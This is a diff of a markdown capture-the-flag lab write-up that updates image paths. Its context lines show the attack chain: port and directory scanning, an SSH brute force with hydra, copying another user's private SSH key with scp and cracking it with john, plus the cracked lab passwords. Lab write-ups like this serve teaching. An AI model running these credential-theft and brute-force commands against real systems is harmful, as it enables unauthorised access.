@@ -63,7 +63,7 @@ nmap -sC -sV -oN nmap.txt 10.10.19.208
 -oN: output scan in normal to given filename<br>
 
 
-![nmap](./nmap.png)
+![nmap](./nmap)
 
 
 **EXPOSED PORT (SERVICE)**:<br>
@@ -84,7 +84,7 @@ nmap -sC -sV -oN nmap.txt 10.10.19.208
 dirb http://10.10.19.208
 ```
 
-![dirb](./dirb.png)
+![dirb](./imgs/dirb.png)
 
 **HIDDEN DIR**: /development
 
@@ -102,7 +102,7 @@ enum4linux -a 10.10.19.208 | tee enum4linux.log
 
 -a: do all simple enumerations
 
-![enum4linux](./enum4linux.png)
+![enum4linux](./imgs/enum4linux.png)
 
 **USERS**: jan, kay
 
@@ -113,7 +113,7 @@ hydra -l jan -P /usr/share/wordlists/rockyou.txt.gz ssh://10.10.19.208
 -l: login name<br>
 -P: password file to iterate through
 
-![hydra](./hydra.png)
+![hydra](./imgs/hydra.png)
 
 **PASSWORD**: armando
 
@@ -142,14 +142,14 @@ scp jan@10.10.19.208:/dev/shm/linpeas.txt linpeas.txt
 scp jan@10.10.19.208:/home/kay/.ssh/id_rsa kay_id_rsa
 ```
 
-![linpeas](./linpeas.png)
+![linpeas](./imgs/linpeas.png)
 
 ```
 ssh2john kay_id_rsa > 4john.txt
 john 4john.txt
 ```
 
-![john](./john.png)
+![john](./imgs/john.png)
 
 **PASSWORD**: beeswax
 
